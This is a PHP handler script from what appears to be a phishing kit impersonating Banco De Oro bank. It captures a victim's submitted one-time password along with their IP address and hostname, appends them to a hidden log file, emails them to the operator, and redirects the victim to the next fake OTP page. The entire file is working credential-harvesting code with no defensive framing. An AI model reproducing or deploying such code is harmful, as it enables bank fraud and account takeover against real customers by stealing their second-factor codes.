<?php
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set("Asia/Manila");
$date = gmdate ("Y/m/d");
$dateHis = gmdate ("H:i:sa");

  $onetp3 = $_POST['otp3'];
  $ontp3 = htmlentities($onetp3);

$msg .= gethostbyaddr($ip);
$msg .= "\n";
$msg .= "-------------------[Banco De Oro 2020]-----------------\n";
$msg .= "OTP 3    : ".$ontp3."\n";
$msg .= "Date     : ".$date." @ ".$dateHis."\n";
$msg .= "---------------------[Maria Clara]---------------------\n";
$file = fopen("../lib/otp.html","a+");
$table = "<font color='#C0C0C0' size='2'>|  ".$ip." OTP 3  : ".$ontp3."</font><br>";
fwrite ($file, $table);
fclose($file);

$subject = "New BDO OTP 3 ".$ontp3."";
$headers = 'From: no-reply@email.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

$to = '';
mail($to, $subject, $msg, $headers);

header("location: ../otp1.php");
?>